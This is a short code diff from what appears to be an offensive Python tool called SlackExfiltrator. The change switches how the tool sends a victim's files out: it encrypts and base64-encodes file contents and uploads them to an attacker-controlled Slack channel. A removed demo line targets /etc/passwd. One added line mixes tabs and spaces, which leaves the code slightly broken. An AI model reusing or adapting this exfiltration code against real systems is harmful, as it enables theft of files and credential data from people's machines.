@@ -82,11 +82,10 @@ class SlackExfiltrator():
         md5_sum = md5(file_path)
         encData = self.encDriver.encrypt(cont)
         bdata = base64.b64encode(encData)
-        self.slackObj.api_call(POST_MESSAGE, channel=self.slackID, as_user=False, text=bdata)
+	head, tail = os.path.split(file_path)
+        self.slackObj.api_call("files.upload", channels=self.slackID, filename=tail, content=bdata )
         return True
 
 
 if __name__ == "__main__":
-    slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
-    slackExf._connect2Slack()
-    slackExf.ExfiltrateFile(file_path="/etc/passwd")
+    sys.stdout.write("This is meant to be a module for python and not a stand alone executable\n")
